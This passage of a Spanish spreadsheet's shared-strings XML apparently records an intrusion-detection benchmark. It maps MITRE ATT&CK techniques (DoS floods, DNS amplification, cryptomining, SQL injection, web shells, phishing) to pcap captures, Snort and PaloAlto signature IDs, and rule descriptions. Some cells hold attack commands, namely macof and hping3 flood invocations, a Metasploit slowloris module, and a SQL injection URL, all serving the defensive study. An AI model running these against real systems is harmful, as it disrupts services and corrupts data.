        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>FortiGate detecta el establecimiento de la sesión con un shell remoto</t>
    </r>
  </si>
  <si>
    <t xml:space="preserve">Ataque colateral: PaloAlto detecta el uso de Metasploit </t>
  </si>
  <si>
    <t>Resource Hijacking</t>
  </si>
  <si>
    <t>T1496</t>
  </si>
  <si>
    <t>Descarga y puesta en marcha de software de criptominado</t>
  </si>
  <si>
    <t>XMRIG</t>
  </si>
  <si>
    <t>T1496-Cryptomining_[2].pcapng</t>
  </si>
  <si>
    <t>Detección por anomalías</t>
  </si>
  <si>
    <t>Manual [2] /  3.3.2.1</t>
  </si>
  <si>
    <t>Manual [5] / C.26</t>
  </si>
  <si>
    <t>Manual [2] / 4.2.2.3</t>
  </si>
  <si>
    <t>El uso de un software de criptominado siempre se considera como un ataque</t>
  </si>
  <si>
    <t>2002752, 2002749, 254</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: Snortv2 no analiza un flujo ICMP y otro IP. Estos flujos no son relevantes para el ataque</t>
    </r>
  </si>
  <si>
    <t xml:space="preserve">9999, 632447088
</t>
  </si>
  <si>
    <t>Network Denial of Service</t>
  </si>
  <si>
    <t>T1498</t>
  </si>
  <si>
    <t>Reflection Amplification</t>
  </si>
  <si>
    <t>T1498.002</t>
  </si>
  <si>
    <t>Amplificación DNS</t>
  </si>
  <si>
    <t>dnsdrdos</t>
  </si>
  <si>
    <t>T1498-Amplif_dns_[1].pcapng</t>
  </si>
  <si>
    <t>Regla genérica que detecte un envío masivo de respuestas DNS no solicitadas con un mismo nombre resuelto hacia la red protegida</t>
  </si>
  <si>
    <t>Manual [1] /  3.5.1</t>
  </si>
  <si>
    <t>Manual [1] / E.14</t>
  </si>
  <si>
    <t>Manual [4] / 4.1.35 y Manual [5] / 5.13.3</t>
  </si>
  <si>
    <t>Siempre se considera como ataque la amplificacion DNS</t>
  </si>
  <si>
    <t>402, 54827</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">2002749, 2100402, 2002752, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2100254, 2013514, 54827, 402</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">2002749, 2100402, 2002752, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2100254, 2013514, 54827, 402</t>
    </r>
  </si>
  <si>
    <t>2002752, 2100402, 2002749, 402</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: la diferencia entre los flujos detectados por las versiones de Snort y los presentes en la captura se debe a la existencia de flujos ICMP  y HPEXT, pero no son relevantes para el ataque</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">Ataques Colaterales: </t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>dentro de la captura hay un flujo DNS que usa tunelización DNS con la herramienta dnscat. Sin embargo, estos paquetes no están relacionados con el ataque en sí</t>
    </r>
  </si>
  <si>
    <t>dns-base -- infrastructure</t>
  </si>
  <si>
    <t>Una vez el ataque ha sido detectado mediante IPS, el control de Aplicaciones nos indica que la app es DNS-Base, directamente relacionado con el ataque. Por lo tanto, el resto de flujos son parte del ataque y contabilizan como detección mediante Control de Aplicaciones</t>
  </si>
  <si>
    <t>5160</t>
  </si>
  <si>
    <t>Fraggle</t>
  </si>
  <si>
    <t>T1498-Fraggle_[1].pcapng</t>
  </si>
  <si>
    <t>Chargen</t>
  </si>
  <si>
    <t>Regla genérica que detecte un envío masivo de datagramas UDP hacia un puerto concreto, con fin de saturarlo y causar su inoperatividad</t>
  </si>
  <si>
    <t>Manual [1] /  3.4.5</t>
  </si>
  <si>
    <t>Manual [1] / E.13</t>
  </si>
  <si>
    <t>Manual [4] / 4.1.36 y Manual [5] / 5.13.3</t>
  </si>
  <si>
    <t>Una denegación de servicio siempre es un ataque</t>
  </si>
  <si>
    <t>2002752, 2002749, 2100402, 402</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: las diferencias entre los flujos detectados son irrelevantes. En Snortv2 no se analiza un flujo ICMP y en Snortv3 se desagrupa un flujo (tranalyzer) en dos. No afectan a los resultados</t>
    </r>
  </si>
  <si>
    <t>Smurf</t>
  </si>
  <si>
    <t>T1498-Smurf_[1].pcapng</t>
  </si>
  <si>
    <t>Regla genérica que detecte un envío masivo de respuestas ICMP</t>
  </si>
  <si>
    <t>Manual [1] /  3.3.1</t>
  </si>
  <si>
    <t>Manual [1] / E.7</t>
  </si>
  <si>
    <t>Manual [4] / 4.1.37 y Manual [5] / 5.13.3</t>
  </si>
  <si>
    <t>2100527, 2002749, 2100408, 2002752, 2101620, 408</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: un flujo HPEXT (L2) no es analizado por ambas versiones de Snort. Dos flujos ICMP (uno de ellos con direcciones IPv6) no son analizados por Snortv2, aunque no son relevantes para el ataque.</t>
    </r>
  </si>
  <si>
    <t>Inundación de TCBPDU</t>
  </si>
  <si>
    <t>yersinia</t>
  </si>
  <si>
    <t>T1498-Tcbpdu_[1].pcapng</t>
  </si>
  <si>
    <t>STP</t>
  </si>
  <si>
    <t>Fuera del alcance del estudio</t>
  </si>
  <si>
    <t>Manual [1] /  3.2.2</t>
  </si>
  <si>
    <t>Manual [1] / E.5</t>
  </si>
  <si>
    <t>Manual [4] / 4.1.38 y Manual [5] / 5.13.3</t>
  </si>
  <si>
    <t>Un ataque de inundación siempre se considera como tal</t>
  </si>
  <si>
    <t>Direct Network Flood</t>
  </si>
  <si>
    <t>T1498.001</t>
  </si>
  <si>
    <t>Inundación HTTP</t>
  </si>
  <si>
    <t>T1498.001-HTTP_flood-C2018_[6].pcapng</t>
  </si>
  <si>
    <t>Regla que detecte envío masivo de mensajes HTTP</t>
  </si>
  <si>
    <t>Manual [4] / B.37</t>
  </si>
  <si>
    <t>Manual [5] / 5.13.3</t>
  </si>
  <si>
    <t>2019348, 2002749, 2002752</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: a causa de la saturación provocada por el ataque, hay un total de 249 flujos que se han visto "podados" a causa de la falta de memoria. Estos flujos son contabilizados por Snortv3 pero no por Snortv2</t>
    </r>
  </si>
  <si>
    <t>Inundación tabla MAC</t>
  </si>
  <si>
    <t>Macof</t>
  </si>
  <si>
    <t>T1498.001-MAC_table_flood_[3].pcapng</t>
  </si>
  <si>
    <t>Inundacion tabla MAC mediante Macof. Comando: sudo macof -i enp0s9 -d 172.16.1.1</t>
  </si>
  <si>
    <t>Manual [3] /  3.8.18</t>
  </si>
  <si>
    <t>Manual [5] / C.27</t>
  </si>
  <si>
    <t>Manual [3] / 3.18.5 y Manual [5] / 5.13.3</t>
  </si>
  <si>
    <t>2101917, 2002749, 2002752, 2100528, 1917</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: todos los flujos son flujos IPv4 (considerados por tranalyzer y Snortv3) salvo dos flujos UDP. Estos son los flujos que detecta Snortv2. Este hecho es entendible partiendo de la premisa de que los IDS por lo general no detectan ataques basados en capas inferiores a la 3 (modelo OSI).</t>
    </r>
  </si>
  <si>
    <t>56049, 56538</t>
  </si>
  <si>
    <t>Inundación TCP</t>
  </si>
  <si>
    <t>T1498.001-TCP_flood-C2018_[6].pcapng</t>
  </si>
  <si>
    <t>Regla que detecte envío masivo de mensajes TCP</t>
  </si>
  <si>
    <t>2016877, 2016870, 2014153, 2050746</t>
  </si>
  <si>
    <t>2016877, 2016870, 2050746</t>
  </si>
  <si>
    <t>50447, 2016877, 2016870, 2014153, 2050746</t>
  </si>
  <si>
    <t>50447, 2016877, 2016870, 2050746</t>
  </si>
  <si>
    <t xml:space="preserve">50447, 2016877, 2016870, 2014153, 2002752, 2002749, 2003394, 2015529, 2015526, 2002828, 2002829 </t>
  </si>
  <si>
    <t xml:space="preserve">50447, 2016877, 2016870, 2002752, 2002749, 2003394, 2015529, 2015526, 2002828, 2002829 </t>
  </si>
  <si>
    <t>9999, 14984, 34767, 40032</t>
  </si>
  <si>
    <t>34767, 9999, 40032</t>
  </si>
  <si>
    <t>Inundación UDP</t>
  </si>
  <si>
    <t xml:space="preserve">  Caldera, hping3</t>
  </si>
  <si>
    <t>T1498.001-UDP_flood_[2].pcapng</t>
  </si>
  <si>
    <t>Regla genérica que detecte un envío masivo de mensajes UDP con destino el mismo puerto objetivo</t>
  </si>
  <si>
    <t>Inundacion UDP en la red de la víctima. Comando: timeout 10s hping3 --udp --flood 192.168.2.2</t>
  </si>
  <si>
    <t>Manual [2] /  3.1.10.2</t>
  </si>
  <si>
    <t>Manual [2]</t>
  </si>
  <si>
    <t>2100525, 2002752, 2002749, 2100402, 402</t>
  </si>
  <si>
    <t>T1498.001-UDP_flood_1-C2018_[6].pcapng</t>
  </si>
  <si>
    <t>Manual [5] / C.28</t>
  </si>
  <si>
    <t>402, 2002749, 2100402, 2002752</t>
  </si>
  <si>
    <t>2002749, 2002752, 2100402, 402</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: Snortv2 no analiza 10 flujos ICMP. Estos flujos son irrelevantes para el análisis del ataque</t>
    </r>
  </si>
  <si>
    <t>T1498.001-UDP_flood_2-C2018_[6].pcapng</t>
  </si>
  <si>
    <t>Endpoint Denial of Service</t>
  </si>
  <si>
    <t>T1499</t>
  </si>
  <si>
    <t>Service Exhaustion Flood</t>
  </si>
  <si>
    <t>T1499.002</t>
  </si>
  <si>
    <t>Inundación DHCP / Inanición</t>
  </si>
  <si>
    <t>DHCPig, yersinia</t>
  </si>
  <si>
    <t>T1499-Dhcp_flood_[1].pcapng</t>
  </si>
  <si>
    <t>DHCP</t>
  </si>
  <si>
    <t>Regla genérica que detecte un envío masivo de procedimientos DHCP completos (DISCOVERY, OFFER, REQUEST, ACK)</t>
  </si>
  <si>
    <t>Manual [1] /  2.4.2.1.1</t>
  </si>
  <si>
    <t>Manual [1] / E.18</t>
  </si>
  <si>
    <t>Manual [4] / 4.1.39 y Manual [5] / 5.13.2</t>
  </si>
  <si>
    <t>El aagotamiento del pool de direcciones de un servidor DHCP siempre es un ataque</t>
  </si>
  <si>
    <t>46533, 2100527, 2002749, 2002752</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: ambas versiones de Snort no analizan el flujo HPEXT de la captura de paquetes (irrelevante para los resultados)</t>
    </r>
  </si>
  <si>
    <t>OS Exhaustion Flood</t>
  </si>
  <si>
    <t>T1499.001</t>
  </si>
  <si>
    <t>LAND</t>
  </si>
  <si>
    <t>T1499-Land_[1].pcapng</t>
  </si>
  <si>
    <t>Regla genérica que detecte envío de mensajes TCP SYN procedentes de la misma dirección IP a la que van dirigidos los paquetes. Los puertos origen/destino pueden ser incluso idénticos</t>
  </si>
  <si>
    <t>Manual [1] /  2.3.1.1.5</t>
  </si>
  <si>
    <t>Manual [1] / E.11</t>
  </si>
  <si>
    <t>Manual [5] / 5.13.2</t>
  </si>
  <si>
    <t>2100527, 2002752, 2002749, 2001579</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">2100527, 2002752, 2002749, 2001579, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2001579</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">2002752, 2002749, 2001579, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2001579</t>
    </r>
  </si>
  <si>
    <t>Application or System Exploitation</t>
  </si>
  <si>
    <t>T1499.004</t>
  </si>
  <si>
    <t>Suplantación MAC</t>
  </si>
  <si>
    <t>ip</t>
  </si>
  <si>
    <t>T1499-Mac_spoof_[1].pcapng</t>
  </si>
  <si>
    <t>ARP</t>
  </si>
  <si>
    <t>Manual [1]</t>
  </si>
  <si>
    <t>Manual [1] / E.2</t>
  </si>
  <si>
    <t>La suplantacion MAC siempre se considera como un ataque</t>
  </si>
  <si>
    <t>366, 29456, 384, 408</t>
  </si>
  <si>
    <t>366, 29456, 384, 408, 2100366</t>
  </si>
  <si>
    <t>366, 29456, 384, 408, 2100366, 2100384, 2002752, 2002749, 2100408, 2101620</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: Snortv2 no analiza los tres flujos ICMP de la captura. Estos flujos no son relevantes para el ataque por lo que aunque afectan a la generación de alertas no son definitivos.</t>
    </r>
  </si>
  <si>
    <t>Reflexión SYN-ACK</t>
  </si>
  <si>
    <t>T1499-Reflexion_synack_[1].pcapng</t>
  </si>
  <si>
    <t>Regla que detecte el envío de mensajes TCP SYN-ACK no solicitados previamente por el la red a proteger</t>
  </si>
  <si>
    <t>Manual [1] /  3.4.2</t>
  </si>
  <si>
    <t>Manual [1] / E.10</t>
  </si>
  <si>
    <t>NO                                                                 (el propio ataque consiste en el envío de peticiones incompletas al servidor)</t>
  </si>
  <si>
    <t>2002752, 2002749, 40063</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: ambas versiones de Snort no analizan el flujo HPEXT de la captura de paquetes (irrelevante para los resultados)</t>
    </r>
  </si>
  <si>
    <t>Reseteo de Conexión</t>
  </si>
  <si>
    <t>ettercap, netwox, nping</t>
  </si>
  <si>
    <t>T1499-Reseteo_[1].pcapng</t>
  </si>
  <si>
    <t>Detección por anomalías que identifique reseteos de conexión periódicos y desde direcciones sospechosas</t>
  </si>
  <si>
    <t>Manual [1] /  2.3.1.1.6</t>
  </si>
  <si>
    <t>Manual [1] / E.12</t>
  </si>
  <si>
    <t>2002752, 2002749, 1325</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: Snortv3 considera un flujo de retransmisión como otro nuevo. Esto no afecta en absoluto a los resultados (no hay flujos sin analizar)</t>
    </r>
  </si>
  <si>
    <t>Inundación SYN con suplantación</t>
  </si>
  <si>
    <t>T1499-Syn_suplantacion_[1].pcapng</t>
  </si>
  <si>
    <t>Regla genérica que detecte el envío prolongado de mensajes TCP SYN que dejan los sockets del equipo a proteger en estado SYN-RECV (no se terminan los handshake de las conexiones TCP establecidas)</t>
  </si>
  <si>
    <t>Manual [1] /  2.3.1.1.3</t>
  </si>
  <si>
    <t>Manual [1] / E.9</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: ambas versiones de Snort no analizan los dos flujos HPEXT de la captura de paquetes (irrelevante para los resultados)</t>
    </r>
  </si>
  <si>
    <t>Denegación de servicio a servidor web</t>
  </si>
  <si>
    <t>T1499.001-OS_Exhaustion_Flood_[3].pcapng</t>
  </si>
  <si>
    <t>Regla que detecte el uso de Slowloris para realizar ataque DDos mediante la comprobación de campos de bytes típicos de la herramienta</t>
  </si>
  <si>
    <t>Uso de metasploit para ataque DoS con herramienta Slowloris. Comando: use auxiliary/dos/http/slowloris</t>
  </si>
  <si>
    <t>Manual [3] /  3.8.16</t>
  </si>
  <si>
    <t>Manual [3] / 3.8.16.4</t>
  </si>
  <si>
    <t>Manual [3] / 3.8.16.5 y Manual [5] / 5.13.2</t>
  </si>
  <si>
    <t>2012870, 40063</t>
  </si>
  <si>
    <t>2002752, 2002749, 2012870, 40063</t>
  </si>
  <si>
    <t>2002752, 2002749, 2012870</t>
  </si>
  <si>
    <t>web-browsing -- internet-utility</t>
  </si>
  <si>
    <t xml:space="preserve">54547, 40094, </t>
  </si>
  <si>
    <t>40094, 54547</t>
  </si>
  <si>
    <t>Una vez detectado el ataque mediante IPS con una alerta que indica HTTP Flood, mediante Control de Aplicaciones somos capaces de catalogar una gran cantidad de flujos identificando aquellos que se corresponden a HTTP</t>
  </si>
  <si>
    <t>Envio solicitudes HTTP a baja tasa</t>
  </si>
  <si>
    <t>Slowhttptest</t>
  </si>
  <si>
    <t>Regla que detecte el envío de mensajes HTTP a baja tasa</t>
  </si>
  <si>
    <t>Uso de Slowhttptest para denegación de servicio a servidor web</t>
  </si>
  <si>
    <t>Manual [5] / C.29</t>
  </si>
  <si>
    <t>Envio solicitudes HTTP parciales</t>
  </si>
  <si>
    <t>Slowloris</t>
  </si>
  <si>
    <t>Regla que detecte el envío de mensajes HTTP parciales o uso de Slowloris</t>
  </si>
  <si>
    <t>Uso de Slowloris para denegación de servicio a servidor web</t>
  </si>
  <si>
    <t>15578, 2002749, 2002752</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: la varianza respecto a los flujos detectados se debe a la propia interpretación de flujos de Snortv3 y a flujos ICMP ignorados por Snortv2. Ninguna de las dos son relevantes para los resultados.</t>
    </r>
  </si>
  <si>
    <t>17533, 107347979</t>
  </si>
  <si>
    <t>9999, 14984, 32452, 40018</t>
  </si>
  <si>
    <t>9999, 40018, 32452</t>
  </si>
  <si>
    <t>Application Exhaustion Flood</t>
  </si>
  <si>
    <t>T1499.003</t>
  </si>
  <si>
    <t>GoldenEye</t>
  </si>
  <si>
    <t xml:space="preserve"> Reglas que detecen envío masivo de solicitudes a servidor web</t>
  </si>
  <si>
    <t>Uso de GoldenEye para denegación de servicio a servidor web</t>
  </si>
  <si>
    <t>2016897, 2016898</t>
  </si>
  <si>
    <t>2016897, 2016898, 50447</t>
  </si>
  <si>
    <t>2002749, 2002752, 2016897, 2016898, 2018208, 2002192, 2002822, 50447</t>
  </si>
  <si>
    <t>2002749, 2002752, 2016898, 2002192, 2002822, 50447</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: la varianza respecto a los flujos detectados se debe a la propia interpretación de flujos de ambas versiones. No hay pérdida de información</t>
    </r>
  </si>
  <si>
    <t>Hulk</t>
  </si>
  <si>
    <t>Uso de Hulk para denegación de servicio a servidor web</t>
  </si>
  <si>
    <t>2012801, 50447, 22953</t>
  </si>
  <si>
    <t>2012801, 50447</t>
  </si>
  <si>
    <t>2002192, 2002749, 2002752, 2002822, 2012801, 2012914, 50447, 22953</t>
  </si>
  <si>
    <t>2002192, 2002749, 2002752, 2002822, 2012801, 2012914, 50447</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: la varianza respecto a los flujos detectados se debe a la propia interpretación de flujos de ambas versiones. No hay pérdida de información</t>
    </r>
  </si>
  <si>
    <t>Server Software Component</t>
  </si>
  <si>
    <t>T1505</t>
  </si>
  <si>
    <t>SQL Stored Procedures</t>
  </si>
  <si>
    <t>T1505.001</t>
  </si>
  <si>
    <t>None (SQL injection using URL)</t>
  </si>
  <si>
    <t>T1505.001-SQL_inyection_[3].pcapng</t>
  </si>
  <si>
    <t>Regla genérica que detecte un intento de inyección SQL insertada en la URL de acceso a una página web, o en su defecto en algunos de los campos de las peticiones</t>
  </si>
  <si>
    <t>"Ejecución de URL en navegador web (http://172.16.2.2:8080/contacto?apellidos=Fernandez%27;%20INSERT%20INTO%20contactos%20values%20(3,%20%27Atacante%27,%20%27Atacante%27,%20%27Atacante%27,%20100)--)"</t>
  </si>
  <si>
    <t>Manual [3] /  3.8.7</t>
  </si>
  <si>
    <t>Manual [3] / 3.8.7.4 y Manual [5] / C.30</t>
  </si>
  <si>
    <t>Manual [3] / 3.8.7.5</t>
  </si>
  <si>
    <t>2011039, 2006444</t>
  </si>
  <si>
    <t>13513, 50447, 19438, 2011039, 2006444</t>
  </si>
  <si>
    <t>13513, 19438, 2011039, 2006444</t>
  </si>
  <si>
    <t>2002752, 2002749, 2100472, 2011039, 2006444, 13513, 50447, 19438</t>
  </si>
  <si>
    <t>50447, 2002752, 2002749, 2100472</t>
  </si>
  <si>
    <t>2011039, 2006444, 13513, 19438</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: Snortv2 no analiza un flujo ICMP. Este flujo no contiene información relacionada con el ataque, por lo que no afecta a los resultados</t>
    </r>
  </si>
  <si>
    <t>Web Shell</t>
  </si>
  <si>
    <t>T1505.003</t>
  </si>
  <si>
    <t>Shell Web</t>
  </si>
  <si>
    <t xml:space="preserve">Regla genérica que detecta el intento de escaneo para comprobar la existencia de backdoor. </t>
  </si>
  <si>
    <t>El ataque busca aprovechar configuracion vulnerable de un servidor WampServer que permite subir y borrar contenido web mediante el uso de HTTP PUT y HTTP DELETE.
Se realiza la subida de un payload a un servidor web</t>
  </si>
  <si>
    <t>Manual [2] /  3.1.5.1</t>
  </si>
  <si>
    <t>Manual [5] / C.31</t>
  </si>
  <si>
    <t>La creación de un Shell Remoto haciendo uso de una conexión web siempre es un ataque</t>
  </si>
  <si>
    <t>50447, 50182, 50202</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">50447, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>50182</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>50202</t>
    </r>
  </si>
  <si>
    <t>50182, 50202</t>
  </si>
  <si>
    <t>2002752, 2002749, 2006408, 50447, 50182, 50202</t>
  </si>
  <si>
    <t>50202, 50182, 50447, 2002752, 2002749</t>
  </si>
  <si>
    <t>50202, 50182</t>
  </si>
  <si>
    <t>9999, 58463</t>
  </si>
  <si>
    <t>58463, 9999</t>
  </si>
  <si>
    <t>Paloalto detecta la subida del payload al servidor a traves de los SIDs 58463, 9999</t>
  </si>
  <si>
    <t>Internal Spear-phishing</t>
  </si>
  <si>
    <t>T1534</t>
  </si>
  <si>
    <t>Phishing interno entre equipos pertenecientes a un dominio con servidor de correo habilitado</t>
  </si>
  <si>
    <t>MailEnabler, Thunderbird</t>
  </si>
  <si>
    <t>T1534-Internal_spearphishing_[4].pcapng</t>
  </si>
  <si>
    <t>SMTP</t>
  </si>
  <si>
    <t>Manual [4] /  3.14</t>
  </si>
  <si>
    <t>Manual [4] / B.14</t>
  </si>
  <si>
    <t>Manual [4] / 4.14</t>
  </si>
  <si>
    <t>El Phishing, en general, puede confundirse con actividad legítima (eso es lo que hace que el ataque tenga éxito). En ese sentido, aunque siempre será un ataque, dependiendo del contexto podrá no distinguirse de una actividad legítima</t>
  </si>
  <si>
    <t>655, 1394, 1917, 3065</t>
  </si>
  <si>
    <t>1394, 1917, 3065</t>
  </si>
  <si>
    <t>655, 1394, 1917, 3065, 38043, 23858</t>
  </si>
  <si>
    <t>1394, 1917, 3065, 38043, 23858</t>
  </si>
  <si>
    <t>655, 1394, 1917, 3065, 38043, 23858, 2101917, 2002752, 2002749, 2001117</t>
  </si>
  <si>
    <t>1394, 1917, 3065, 38043, 23858, 2101917, 2002752, 2002749, 2001117</t>
  </si>
  <si>
    <t>smtp-base -- email</t>
  </si>
  <si>
    <t>56953, 56951, 57018, 56952</t>
  </si>
  <si>
    <t>Transfer Data to Cloud Account</t>
  </si>
  <si>
    <t>T1537</t>
  </si>
  <si>
    <t>Transferir archivos de una cuenta a otra mediante un servicio en la nube</t>
  </si>
  <si>
    <t>OneDrive</t>
  </si>
  <si>
    <t>T1537-Transfer_Data_to_Cloud_Account_[5].pcapng</t>
  </si>
  <si>
    <t>Transferir entre dos cuentas en la nube unos ficheros</t>
  </si>
  <si>
    <t>Manual [5] /  4.9.2</t>
  </si>
  <si>
    <t>Manual [5] / C.10</t>
  </si>
  <si>
    <t>Manual [5] /  5.12.6</t>
  </si>
  <si>
    <t>Transferir datos a la nube puede considerarse tráfico legítimo o ataque dependiendo de las circunstancias</t>
  </si>
  <si>
    <t>254, 59597</t>
  </si>
  <si>
    <t>2002752, 2002749, 254, 59597</t>
  </si>
  <si>
    <t>ms-onedrive-business -- file sharing</t>
  </si>
  <si>
    <t>93031, 9999, 14978</t>
  </si>
  <si>
    <t>Pre-OS Boot</t>
  </si>
  <si>
    <t>T1542</t>
  </si>
  <si>
    <t>TFTP Boot</t>
  </si>
  <si>
    <t>T1542.005</t>
  </si>
  <si>
    <t xml:space="preserve">Modificación de imagen de SO mediante la suplantación de un Server TFTP </t>
  </si>
  <si>
    <t>T1542.005-TFTP_Boot_[5].pcapng</t>
  </si>
  <si>
